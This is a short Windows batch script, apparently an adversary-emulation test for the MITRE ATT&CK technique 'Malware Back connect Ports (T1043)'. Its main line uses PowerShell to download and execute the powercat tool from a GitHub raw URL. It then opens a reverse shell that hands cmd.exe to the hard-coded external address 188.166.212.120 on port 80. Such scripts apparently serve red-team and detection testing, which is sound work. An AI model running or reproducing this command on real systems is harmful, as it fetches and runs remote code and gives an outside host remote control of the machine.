@ECHO OFF
CLS
color 0E


ECHO ===========================================================================
ECHO Technique: Malware Back connect Ports (T1043)
ECHO.
ECHO [+] Commonly Used Port for Communication
ECHO -------------------------------------------------------------------
cmd.exe /c powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/rajrakeshdr/powercat/master/powercat.ps1'); $m = powercat -c 188.166.212.120 -p 80 -e cmd -v; $m
ECHO.

